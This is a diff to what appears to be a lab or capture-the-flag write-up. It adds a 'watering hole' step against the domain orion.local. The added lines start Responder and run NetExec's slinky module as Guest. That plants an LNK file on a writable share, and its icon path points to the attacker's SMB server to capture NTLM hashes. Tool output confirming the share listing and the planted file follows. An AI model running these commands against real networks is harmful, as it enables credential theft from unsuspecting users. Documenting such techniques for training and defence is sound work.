@@ -213,6 +213,30 @@ Since i have write access i could try a watering hole attack
 # Watering hole attack
 
 ```python
-sudo resp
+❯❯❯ sudo responder -I tun0
 ```
 
+First ill start responder
+
+```python
+❯❯❯ nxc smb ws-it.orion.local -u 'Guest' -p '' --smb-timeout 5 -M slinky -o SERVER=192.168.211.2 NAME=meeting ICO_URL=\\\\192.168.211.2\\share SHARES=Uploads 
+SMB         10.0.0.6        445    WS-IT            [*] Windows 11 / Server 2025 Build 26100 x64 (name:WS-IT) (domain:orion.local) (signing:True) (SMBv1:None)
+SMB         10.0.0.6        445    WS-IT            [+] orion.local\Guest: 
+SMB         10.0.0.6        445    WS-IT            [*] Enumerated shares
+SMB         10.0.0.6        445    WS-IT            Share           Permissions     Remark
+SMB         10.0.0.6        445    WS-IT            -----           -----------     ------
+SMB         10.0.0.6        445    WS-IT            ADMIN$                          Remote Admin
+SMB         10.0.0.6        445    WS-IT            C$                              Default share
+SMB         10.0.0.6        445    WS-IT            Company                         Company documents - all staff
+SMB         10.0.0.6        445    WS-IT            IPC$            READ            Remote IPC
+SMB         10.0.0.6        445    WS-IT            IT                              IT admins only
+SMB         10.0.0.6        445    WS-IT            Uploads         READ,WRITE      Public Upload Share
+SLINKY      10.0.0.6        445    WS-IT            [+] Found writable share: Uploads
+SLINKY      10.0.0.6        445    WS-IT            [+] Created LNK file on the Uploads share
+```
+
+Ill use the nxc slinky module to create and upload the file for me
+
+```python
+
+```
